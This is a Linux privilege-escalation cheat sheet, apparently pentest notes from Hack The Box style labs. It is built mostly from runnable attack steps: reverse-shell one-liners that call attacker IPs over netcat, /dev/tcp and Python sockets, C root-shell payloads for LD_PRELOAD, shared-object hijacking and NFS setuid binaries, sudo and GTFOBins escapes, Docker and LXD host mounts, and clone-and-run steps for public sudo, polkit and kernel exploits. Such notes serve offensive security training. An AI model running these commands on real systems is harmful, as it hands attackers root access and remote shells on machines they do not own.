# Special Permissions
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s
```
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command:
# sudo -l
## (ALL) NOPASSWD: /usr/sbin/tcpdump

First, make a file to execute with the postrotate-command, adding a simple reverse shell one-liner.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```
```
/tmp/.test
```
Next, start a netcat listener on our attacking box 
```
nc -lvnp 443
```
run tcpdump as root with the postrotate-command
```
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
## env_keep+=LD_PRELOAD
create a file called root.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Compile root.c
```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
(root) NOPASSWD: /usr/sbin/apache2 restart
```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
## /usr/bin/python3
1. python script available on the machine, example called mem_status.py
```
ls -l mem_status.py
rwSrwxr-x
```
2. Having the S present means the SUID/SGID permissions are set
3. So we can execute this script with the privileges of another user, in our case, as root. We also have permission to view the script and read its contents.
4. See in the second line that this script imports the module psutil and uses the function virtual_memory().
5. look for this function in the folder of psutil and check if this module has write permissions for us.
```
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```
5. we have several results, check where you have a write permission on one of the scripts
```
ls -l /usr/local/lib/python3.8/dist-packages/psutil/init.py
```
6. Look for the function discovered earlier (def virutal_memory() in our case) and insert a command to test the vulnerability
```
def virutal_memory():
```
```
import os
```
```
os.system('id')
```
```
sudo /usr/bin/python3 ./mem_status.py
```
```
id executed
```
7. Organize the python3 reverse shell (which is originally a one liner) to the following and insert it insted of the system id command
```
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.93",4242))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```
```
sudo /usr/bin/python3 ~/mem_status.py
```
## sudo -l
```
SETENV:
```
```
/usr/bin/python3
```
## create psutil.py modile inside /tmp
```
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
In this example, we moved the previous python script from the /usr/lib/python3.8 directory to /tmp. From here we once again call /usr/bin/python3 to run mem_stats.py, however, we specify that the PYTHONPATH variable contain the /tmp directory so that it forces Python to search that directory looking for the psutil module to import
## CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the /etc/sudoers file to execute a specific command.
all versions below 1.8.28
```
sudo -u#-1 <command showed in sudo -l>
```
### example /usr/bin/id
```
sudo -u#-1 id
```
### example /usr/bin/ncdu
```
sudo -u#-1 /usr/bin/ncdu /root
```
```
sudo -V | head -n1
```

## (ALL) NOPASSWD: /usr/bin/openssl
```
LFILE=file_to_read
```
```
openssl enc -in "$LFILE"
```
Read the /etc/shadow file or obtain a reverse shell as the ida_rsa private key file will grant us SSH back into the environment as the root user
## (ALL) NOPASSWD: /bin/nano /opt/priv
## GTFOBins
```
$ sudo /bin/nano /opt/priv
```
```
^R^X
```
```
reset; sh 1>&0 2>&0
```
## /usr/bin/sudo /usr/bin/journalctl
```
$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
...
lines 1-6/6 (END)
!/bin/bash
root@traverxec:/home/david# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david# cat /root/root.txt 
9aa36a**************************
```
## fail2ban
```
https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/
```
```
https://0xdf.gitlab.io/2022/10/29/htb-trick.html
```
# id

## 110(lxd)
### Starting a privileged container
#### Unzip the Alpine image.
```
unzip alpine.zip
```
#### Start the LXD initialization process. Choose the defaults for each prompt
#### Import the local image.
```
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host
```
lxc init alpine r00t -c security.privileged=true
```
#### Mount the host file system.
```
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type cd /mnt/root/root
```
lxc start r00t
```
```
lxc exec r00t /bin/sh
```
## 4(adm)
Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs
Check the audit.log file 
use aureport to view the contents
```
aureport --tty | less
```
## 116(lxd)
We can either create our own container and transfer it to the target system or use an existing container
```
cd ContainerImages
```
```
ubuntu-template.tar.xz
```
Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use.
For this, we need to import this container as an image.
```
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```
```
lxc image list
```
After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host
```
lxc init ubuntutemp privesc -c security.privileged=true
```
```
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root
```
container-user@nix02:~$ lxc start privesc
```
```
container-user@nix02:~$ lxc exec privesc /bin/bash
```
```
root@nix02:~# ls -l /mnt/root
```
## 116(docker)
```
docker image ls
```
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
## 999(docker)
Article: https://flast101.github.io/docker-privesc
Script: https://github.com/flast101/docker-privesc/blob/master/docker-privesc.sh
### docker images
replace alpine with ubuntu for example depending on the output of this command
# Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers
```
docker run -v /root:/mnt -it ubuntu
```
This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user
A case that can also occur is when the Docker socket is writable. Usually, this socket is located in /var/run/docker.sock
```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
## docker.sock
From here on, we can use the docker to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it here and upload it to the Docker container.
```
https://master.dockerproject.org/linux/x86_64/docker
```
```
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
```
```
htb-student@container:/tmp$ chmod +x docker
```
```
htb-student@container:/tmp$ ls -l
```
```
htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps
```
We can create our own Docker container that maps the host’s root directory (/) to the /hostsystem directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the main_app Docker image.
```
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```
```
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
```
Now, we can log in to the new privileged Docker container with the ID 7ae3bcc818af and navigate to the /hostsystem.
```
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
```
ssh root@<host IP> -i root.priv
```
## Docker Shared Directories
When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.
```
cd /hostsystem/home/user1
```
```
cat .ssh/id_rsa
```
```
ssh user1@<host IP> -i user1.priv
```
save it to user1.rpiv
# Capabilities
## Enumerating Capabilities
```
cr
```
```
/usr/bin/vim.basic
```
## Exploitation
```
getcap /usr/bin/vim.basic
```
```
/usr/bin/vim.basic /etc/passwd
```
1. delete the x within the root line (which sets the password for root user)
2. no password needed after issuing the su root command
# screen -v
## Screen version 4.05.00
### Privilege Escalation - Screen_Exploit.sh
Navigate to this link for more details
```
https://github.com/YasserREED/screen-v4.5.0-priv-escalate
```
# Certain applications create cron files in the /etc/cron.d directory and may be misconfigured to allow a non-root user to edit them.
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
A quick look in the /dmz-backups directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration.
The second issue is that the backup.sh shell script is world writeable and runs as root
1. We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.
```
./pspy64 -pf -i 1000
```
2. The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan procfs every 1000ms (or every second)
3. From the above output, we can see that a cron job runs the backup.sh script located in the /dmz-backups directory and creating a tarball file of the contents of the /var/www/html directory
4. add a Bash one-liner reverse shell.
```
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```
5. netcat listener
```
nc -lvnp 443
```
# Logrotate
This tool is usually started periodically via cron and controlled via the configuration file /etc/logrotate.conf
1. we need to write permissions on the log files
2. logrotate myst run as a privileged user or root
3. vulnerable versions:
```
3.8.6
3.11.0
3.15.0
3.18.0
```
4. Download and compile logrotten exploiton a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system
```
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
```
```
logger@nix02:~$ cd logrotten
```
```
logger@nix02:~$ gcc logrotten.c -o logrotten
```
5. Determine which option logrotate uses in logrotate.conf.
```
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```
## Steps for exploit
1. Create payload
```
echo 'bash -i >& /dev/tcp/10.10.14.211/9001 0>&1' > payload
```
2. Transfer logrotten.c to the machine
```
scp or wget
```
3. Trigger log rotate (where log files are accessible, for example log files are in /home/htb-student/backups/access.log)
```
echo test > /home/htb-student/backups/access.log
```
4. Run logrotten
```
./logrotten -p ./payload /home/htb-student/backups/access.log
```
# tcpdump
If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext
# NFS
```
showmount -e 10.129.2.12
```
```
cat /etc/exports
```
```
rw,no_root_squash
```
For example, we can create a SETUID binary that executes /bin/sh using our local root user. We can then mount the /tmp directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.
1. Create a simple binary, mount the directory locally, copy it, and set the necessary permissions.
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```
```
shell.c
```
```
gcc shell.c -o shell
```
```
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
```
```
root@Pwnbox:~$ cp shell /mnt
```
```
root@Pwnbox:~$ chmod u+s /mnt/shell
```
2. Run the shell app on the host machine
```
./shell
```
```
id
```
```
root
```
# tmux
If we can compromise a user in the `dev` group, we can attach to this session and gain root access.
1. Check for any running `tmux` processes.
```
htb@NIX02:~$  ps aux | grep tmux
```
```
root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```
2. Confirm permissions.
```
ls -la /shareds 
```
```
srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```
3. Review our group membership.
```
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```
4. Finally, attach to the tmux session and confirm root privileges.
```
tmux -S /shareds
```
```
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```
# uname -a
## example: Linux 4.4.0-116-generic
google  linux 4.4.0-116-generic exploit, we get the following exploit
```
https://vulners.com/zdt/1337DAY-ID-30003
```
```
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```
```
./kernel_exploit
```
# Shared Object Hijacking
could have the following files inside the shared object folder
```
file.so
```
```
file.c
```
```
file.h
```
the shared object could be highlighted in red and does not have an extension
### Example: payroll is shared object
```
ls -la payroll
```
```
ldd payroll
```
notice any non-standard library
example is libshared.so
it is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.
```
readelf -d payroll  | grep PATH
```
The configuration allows the loading of libraries from the /development folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in /development, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).
We can copy an existing library to the development folder. Running ldd against the binary lists the library's path as /development/libshared.so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named dbquery. We can compile a shared object which includes this function.
1. create file called src.c
```
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
printf("Malicious library loaded\n");
setuid(0);
system("/bin/sh -p");
}
```
```
gcc src.c -fPIC -shared -o /development/libshared.so
```
```
./payroll
```
# Library Path
## PYTHONPATH Listing
```
python3 -c 'import sys; print("\n".join(sys.path))'
```
The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable.
We must have write permissions to one of the paths having a higher priority on the list.
### Taking the example of psutil (previously)
### Psutil Default Installation Location
```
pip3 show psutil
```
From this example, we can see that psutil is installed in the following path: /usr/local/lib/python3.8/dist-packages. From our previous listing of the PYTHONPATH variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us write access to any of them.
After checking all of the directories listed, it appears that /usr/lib/python3.8 path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the PYTHONPATH variable, we can see that this path is higher on the list than the path in which psutil is installed in
In order to get to this point, we need to create a file called psutil.py containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack
Hijacked Module Contents - psutil.py 
CREATED inside a directory (where we have write privilegees) that is called before the actual path from pip3 show psutil
```
#!/usr/bin/env python3

import os

def virtual_memory():
os.system('id')
```
run mem_status.py
```
sudo /usr/bin/python3 mem_status.py
```
# sudo -V | head -n1
## affected the sudo versions
```
1.8.31 - Ubuntu 20.04
1.8.27 - Debian 10
1.9.2 - Fedora 33
Others
```
## CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability
1. git clone https://github.com/blasty/CVE-2021-3156.git
```
make
```
2. find out which version of the operating system we are dealing with
```
cat /etc/lsb-release
```
```
./sudo-hax-me-a-sandwich
```
3. choose option according to the OS
```
all versions below 1.8.28
```
# grep PRETTY /etc/os-release
## Ubuntu 20.04
## Polkit
https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/
```
git clone https://github.com/arthepsy/CVE-2021-4034.git
```
```
cd CVE-2021-4034
```
```
gcc cve-2021-4034-poc.c -o poc
```
```
./poc
```
# uname -r (check if gcc is available on the target host)
## All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability.
```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```
```
cd CVE-2022-0847-DirtyPipe-Exploits
```
```
bash compile.sh
```
### two different exploits available
Simply run the first exploit
```
./exploit-1
```
For the second exploit, find SUID Binaries
```
find / -perm -4000 2>/dev/null
```
Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.
```
./exploit-2 /usr/bin/sudo
```
## Vulnerable kernel versions: 2.6 - 5.11
### CVE-2021-22555
```
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```
```
gcc -m32 -static exploit.c -o exploit
```
```
./exploit
```
## Linux kernel 5.4 through 5.6.10
### CVE-2022-25636
```
git clone https://github.com/Bonfee/CVE-2022-25636.git
```
```
cd CVE-2022-25636
```
```
make
```
```
./exploit
```
## vulnerability in the Linux Kernel up to version 6.3.1
### CVE-2023-32233
This vulnerability exploits the so called anonymous sets in nf_tables by using the Use-After-Free vulnerability
```
git clone https://github.com/Liuk3r/CVE-2023-32233
```
```
cd CVE-2023-32233
```
```
gcc -Wall -o exploit exploit.c -lmnl -lnftn
```
```
./exploit
```
# netstat -antp
```
127.0.0.1:11211
```
## Memcache
```
Memcache Exploit : https://niiconsulting.com/checkmate/2013/05/memcache-exploit/
```
### 11211 - Pentesting Memcache : https://book.hacktricks.xyz/pentesting/11211-memcache
```
echo "version" | nc -vn localhost 11211
```
```
echo "version" | nc -vn 127.0.0.1 11211
```
```
echo "get account" | nc -vn 127.0.0.1 11211
```
```
echo "get user" | nc -vn 127.0.0.1 11211
```
```
echo "get passwd" | nc -vn 127.0.0.1 11211
```
### telnet localhost 11211
```
ash@cache:~$ telnet localhost 11211
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
get user
VALUE user 0 5
luffy
END
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
```
# linpeas (sysinfo)
```
[+] Readable files belonging to root and readable by me but not world readable
```
```
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
```
```
strings /bin/sysinfo
```
```
free -h
```
We write the following content in a file named free
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
```
theseus@ubuntu:/var/tmp$ wget http://10.10.14.20/free
```
```
theseus@ubuntu:/var/tmp$ chmod 755 free
```
Prepend the current directory or where the new “free” executable is located to the PATH variable (this is the important part of this privilege escalation process), and run sysinfo to gain a root shell:
```
theseus@ubuntu:/var/tmp$ PATH=/var/tmp:$PATH
```
```
theseus@ubuntu:/var/tmp$ sysinfo
```
```
nc -nlvp 1337
```


# LineEnum.sh
```
$ ./LinEnum.sh
...
[+] Possibly interesting SGID files:
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
...
```
Admin is able to run this file as root which is very promising. There is an entry for jjs on GTFOBins. One such thing we can do is make arbitrary reads/writes to the system. If we wanted some persistence, we could write our SSH key to root's authorized keys. Since we just need the flag, we can read it.
```
$ echo 'var BufferedReader = Java.type("java.io.BufferedReader");
> var FileReader = Java.type("java.io.FileReader");
> var br = new BufferedReader(new FileReader("/root/root.txt"));
> while ((line = br.readLine()) != null) { print(line); }' | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
8a8ef7**************************
search the files for interesting data
grep -iR passwd *
If you have an internal listening service
cat /etc/apache2/sites-available/internal.conf 
Listen 127.0.0.1:52846
```
# If you have an internal listening service
```
cat /etc/apache2/sites-available/internal.conf 
```
```
Listen 127.0.0.1:52846
```
```
curl localhost:52846/main.php
```
# tcpdump
Since we have root access on dmz01 via SSH, we can run tcpdump as it's on the system. It can never hurt to "listen on the wire" whenever possible during a pentest and see if we can grab any cleartext credentials or generally uncover any additional information that may be useful for us
```
root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap
```
We could now transfer this down to our host and open it in Wireshark to see if we were able to capture anything.
# gcore privilege escalation
[https://wiki.sentnl.io/security/hacking-demos/getting-passwords-of-logged-in-users](https://wiki.sentnl.io/security/hacking-demos/getting-passwords-of-logged-in-users)
# /etc/passwd is writable
Delete root password 
```
root::0:0:root:/root:/bin/bash
```
